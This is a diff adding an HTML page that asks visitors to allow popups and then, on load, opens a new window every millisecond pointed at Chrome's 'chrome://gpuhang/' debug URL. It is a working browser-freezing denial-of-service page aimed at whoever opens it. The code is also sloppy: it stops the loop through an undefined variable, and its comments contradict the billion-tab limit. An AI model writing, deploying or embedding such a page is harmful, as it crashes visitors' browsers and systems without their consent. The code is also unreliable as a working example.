@@ -1,1 +1,28 @@
 
+<!DOCTYPE html>
+<html>
+<head>
+  You need to allow popups and redirects for this to work
+  <title>Enable Popups and redirects</title>
+</head>
+<body>
+
+  <script>
+    function openNewTab() {
+      var count = 0;
+      setInterval(function() {
+        count++;
+        window.open("chrome://gpuhang/", "_blank", "width=600,height=400,scrollbars=yes"); // Replace with desired URL
+        if (count > 1000000000) {
+          clearInterval(intervalId); // Stop after opening a few tabs
+        }
+      }, 1); // Open a tab every milisecond (will probably lag though)
+      
+    }
+
+    // Call the function to start opening tabs
+    openNewTab();
+  </script>
+
+</body>
+</html>
